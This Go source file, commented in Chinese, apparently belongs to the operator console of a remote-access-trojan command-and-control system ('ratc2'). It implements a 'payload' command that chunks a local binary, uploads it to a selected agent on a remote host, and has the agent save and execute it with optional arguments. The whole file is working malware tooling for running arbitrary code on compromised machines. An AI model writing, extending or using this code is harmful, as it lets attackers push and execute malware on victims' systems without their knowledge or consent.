// payload.go — payload 分块上传并执行（协议 §10，指令 0x3009）
package main

import (
	"encoding/binary"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"ratc2/internal/protocol"
)

// encodePayloadChunk 按协议 §10 编码一块（C2 会自动剥离 16B agent_id 前缀）：
//
//	name_len u16 | name | args_len u16 | args | offset u64 | flags u8 | data_len u32 | data
func encodePayloadChunk(name, args string, offset uint64, last bool, data []byte) []byte {
	b := make([]byte, 0, 2+len(name)+2+len(args)+8+1+4+len(data))
	b = binary.LittleEndian.AppendUint16(b, uint16(len(name)))
	b = append(b, name...)
	b = binary.LittleEndian.AppendUint16(b, uint16(len(args)))
	b = append(b, args...)
	b = binary.LittleEndian.AppendUint64(b, offset)
	var flags uint8
	if last {
		flags = protocol.PayloadFlagLast
	}
	b = append(b, flags)
	b = binary.LittleEndian.AppendUint32(b, uint32(len(data)))
	b = append(b, data...)
	return b
}

// parsePayloadArgs 解析 "payload <local_file> [remote_name] [--args <命令行参数>]"
func parsePayloadArgs(rest string) (local, remote, execArgs string) {
	if i := strings.Index(rest, "--args"); i >= 0 {
		execArgs = strings.TrimSpace(rest[i+len("--args"):])
		execArgs = strings.Trim(execArgs, "\"")
		rest = strings.TrimSpace(rest[:i])
	}
	f := strings.Fields(rest)
	if len(f) > 0 {
		local = f[0]
	}
	if len(f) > 1 {
		remote = f[1]
	}
	return
}

// cmdPayload 读取本地二进制 → 分块上传（256KiB/块）→ 末块在 Agent 端落盘并执行。
// 中间块流水线发送不等待（TCP 有序，Agent 顺序写盘），仅末块等待执行结果。
func (st *shellState) cmdPayload(rest string) {
	local, remote, execArgs := parsePayloadArgs(rest)
	if local == "" {
		fmt.Println("usage: payload <local_file> [remote_name] [--args <命令行参数>]")
		return
	}
	agentID, err := st.currentAgentIDHex()
	if err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	data, err := os.ReadFile(local)
	if err != nil {
		fmt.Printf("[!] read %s: %v\n", local, err)
		return
	}
	if remote == "" {
		remote = filepath.Base(local)
	}
	if len(remote) == 0 || len(remote) > protocol.PayloadMaxNameLen {
		fmt.Printf("[!] remote name 长度非法（1-%d）\n", protocol.PayloadMaxNameLen)
		return
	}
	if len(data) > protocol.PayloadMaxTotal {
		fmt.Printf("[!] payload 超过上限 %d 字节\n", protocol.PayloadMaxTotal)
		return
	}
	total := len(data)
	chunk := payloadChunkSize
	n := (total + chunk - 1) / chunk
	if n == 0 {
		n = 1 // 空文件也发一个末块，以便触发执行
	}
	fmt.Printf("[*] uploading %s -> %s (%d bytes, %d chunks) to %s ...\n",
		local, remote, total, n, shortID(agentID))

	for i := 0; i < n; i++ {
		off := i * chunk
		end := off + chunk
		if end > total {
			end = total
		}
		last := i == n-1
		body := encodePayloadChunk(remote, execArgs, uint64(off), last, data[off:end])

		if !last {
			// 流水线：不等待中间块结果
			if err := st.businessNoWait(protocol.CmdPayload, protocol.PluginSys, body); err != nil {
				fmt.Printf("[!] send chunk %d/%d: %v\n", i+1, n, err)
				return
			}
			continue
		}

		status, resp, err := st.businessRawTo(agentID, protocol.CmdPayload,
			protocol.PluginSys, body, waitTimeout)
		if err != nil {
			fmt.Printf("[!] %v\n", err)
			return
		}
		if status != protocol.StatusOK {
			fmt.Printf("[!] agent status=%d: %s\n", status, trunc(string(resp), 300))
			return
		}
		fmt.Printf("[*] %s\n", strings.TrimSpace(string(resp)))
	}
}
